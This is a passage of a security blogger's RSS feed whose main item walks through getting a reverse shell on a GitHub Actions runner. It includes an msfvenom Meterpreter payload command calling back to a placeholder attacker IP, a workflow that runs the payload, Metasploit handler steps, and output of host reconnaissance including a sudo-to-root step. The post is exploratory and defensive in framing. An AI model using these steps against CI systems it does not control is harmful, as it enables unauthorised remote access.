&lt;p&gt;There’s a starter set of playbooks up now, and I’ll plan to expand this as I get more ideas.  Also there should be walkthroughs for each of the clusters, in case people want the cheat sheet version :)&lt;/p&gt;

</description>
				<pubDate>Sat, 14 Sep 2019 17:10:39 +0100</pubDate>
				<link>/blog/2019/09/14/kube-security-lab/</link>
				<guid isPermaLink="true">/blog/2019/09/14/kube-security-lab/</guid>
			</item>
		
			<item>
				<title>Shells in Github Actions</title>
				<description>&lt;p&gt;I recently got my beta invite to the awesome &lt;a href=&quot;https://github.com/features/actions&quot;&gt;Github Actions&lt;/a&gt; feature.  This is a free to use CI/CD system.  If you’re not familiar with CI/CD, you can think of it as a system which runs a series of actions during your development process to help test/maintain/deploy it.  For example you could use CI to run your test suite on every commit, so you know if someone just broke the build.&lt;/p&gt;

&lt;p&gt;To do this we use “runners” which are essentially execution environments (e.g. a Virtual Machine) that runs our tests or other actions.&lt;/p&gt;

&lt;p&gt;Of course what do pentesters think, seeing the idea that someone’s going to let me execute commands somewhere… “hey can I get a shell on that?” :)&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://twitter.com/antitree/status/1164193020612423680?s=20&quot;&gt;Antitree got there first on twitter&lt;/a&gt; but I thought it could be fun to walk through the process in a little more detail than twitter’s format allows.&lt;/p&gt;

&lt;p&gt;The pre-requisite for this is that your Github account has actions enabled.  Once you’ve got that here’s a set of steps to get a shell on one of Github’s runners.&lt;/p&gt;

&lt;p&gt;It’s worth noting that what we’re detailing below isn’t likely any kind of security issue for Github, I’d expect that they’re providing dedicated ephemeral instances as CI runners, so you’re not likely to get access to anyone else’s infrastructure using this technique, it’s just a bit of fun :)&lt;/p&gt;

&lt;p&gt;One thing to note though in general for CI/CD environments is how important isolation is, if you’re running untrusted code in pipelines.  As we’ll show here, it’s pretty easy to get a shell back out of a runner, so don’t run these in a network with other important hosts…&lt;/p&gt;

&lt;h3 id=&quot;prepare-the-payload&quot;&gt;Prepare the payload&lt;/h3&gt;

&lt;p&gt;Just like in the previous post on &lt;a href=&quot;https://raesene.github.io/blog/2019/08/10/making-it-rain-shells-in-Kubernetes/&quot;&gt;Kubernetes shells&lt;/a&gt; we’re going to use &lt;a href=&quot;https://www.metasploit.com/&quot;&gt;Metasploit&lt;/a&gt; for this.  So we need a reverse shell payload that we can call back to.  For this, you’ll need to have the port receiving the connection visible on the Internet with no firewall in the way, you could use something like a Digital Ocean droplet or EC2 instance for this.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p linux/x64/meterpreter_reverse_http LHOST=YOURIP LPORT=YOURPORT -f elf &amp;gt; reverse_shell.elf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;just replace &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;YOURIP&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;YOURPORT&lt;/code&gt; with your information.&lt;/p&gt;

&lt;p&gt;Now we’ve got a shell program, just start a new Github repository and add the shell to the repo.&lt;/p&gt;

&lt;h3 id=&quot;our-gtihub-action&quot;&gt;Our Gtihub Action&lt;/h3&gt;

&lt;p&gt;We just need to create our action now that will get triggered when we push changes to our Github repository.  Github actions live in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.github/workflows/&lt;/code&gt; and are in YAML format.  Create a file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;testaction.yml&lt;/code&gt; in there and you can put something like this into the file.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;name: Shell

on: [push]

jobs:

  build:
 
    runs-on: ubuntu-latest
 
    steps:
    - uses: actions/checkout@v1
    - name: metasploit reverse shell
      run: ./reverse_shell.elf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now when we commit our repository, Github should run our action.  Before we do that make sure to set-up Metasploit to receive the connection.&lt;/p&gt;

&lt;h3 id=&quot;metasploit-handler&quot;&gt;Metasploit handler&lt;/h3&gt;

&lt;p&gt;after running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfconsole&lt;/code&gt; you can do the following steps&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;use exploit/multi/handler&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;set payload linux/x64/meterpreter_reverse_http&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;set LHOST YOURIP&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;set LPORT YOURPORT&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Then push your shell and action code to Github to trigger the action, and all being well you should get a shell :)&lt;/p&gt;

&lt;h3 id=&quot;looking-around-a-github-runner&quot;&gt;Looking around a Github runner&lt;/h3&gt;

&lt;p&gt;So once you’ve got your shell what can you see? Well it’s running an Ubuntu based distro, as we’d expect (it is possible to get Windows or indeed Mac runners, so you could repeat this exercise with them)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;“Privesc”&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;When you first get the shell, you’re running as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;runner&lt;/code&gt; user but it’s got passwordless &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt; access, so you can just &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo bash&lt;/code&gt; to get &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Listening ports&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ss -ltnp&lt;/code&gt; will show us the listening TCP ports&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port    
LISTEN   0         80                127.0.0.1:3306             0.0.0.0:*       
LISTEN   0         128           127.0.0.53%lo:53               0.0.0.0:*       
LISTEN   0         128                 0.0.0.0:22               0.0.0.0:*       
LISTEN   0         128                    [::]:22                  [::]:*  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3306/TCP&lt;/code&gt; is kind of interesting, as my action didn’t make any use of MySQL.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Routing Table&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Nothing hugely interesting on the routing table, although interesting that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker0&lt;/code&gt; is there, so we’re running Docker on the runner host.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         10.1.0.1        0.0.0.0         UG    100    0        0 eth0
10.1.0.0        0.0.0.0         255.255.0.0     U     0      0        0 eth0
168.63.129.16   10.1.0.1        255.255.255.255 UGH   100    0        0 eth0
169.254.169.254 10.1.0.1        255.255.255.255 UGH   100    0        0 eth0
172.17.0.0      0.0.0.0         255.255.0.0     U     0      0        0 docker0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Running Processes&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;One thing I thought was interesting, although not really surprising, is that there are quite a few dotnet core processes running on the host.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Users on the host&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;A quick look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; shows up a couple of non-standard users&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pollinate:x:110:1::/var/cache/pollinate:/bin/false
mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
sphinxsearch:x:112:117:Sphinx fulltext search service,,,:/var/run/sphinxsearch:/usr/sbin/nologin
runneradmin:x:1000:1000:Ubuntu:/home/runneradmin:/bin/bash
runner:x:1001:115:,,,:/home/runner:/bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h3&gt;

&lt;p&gt;This is just a quick exploration of a Github Actions runner host, showing some of the techniques that can be used to get shells in CI systems, if you have the ability to submit commands to them.&lt;/p&gt;

&lt;p&gt;Overall Github actions looks really cool, and I’m looking forward to integrating it into a lot of my repo’s alongside their private repository feature.&lt;/p&gt;
</description>
				<pubDate>Sun, 25 Aug 2019 13:10:39 +0100</pubDate>
				<link>/blog/2019/08/25/shells-in-gh-actions/</link>
				<guid isPermaLink="true">/blog/2019/08/25/shells-in-gh-actions/</guid>
			</item>
		
	</channel>
</rss>
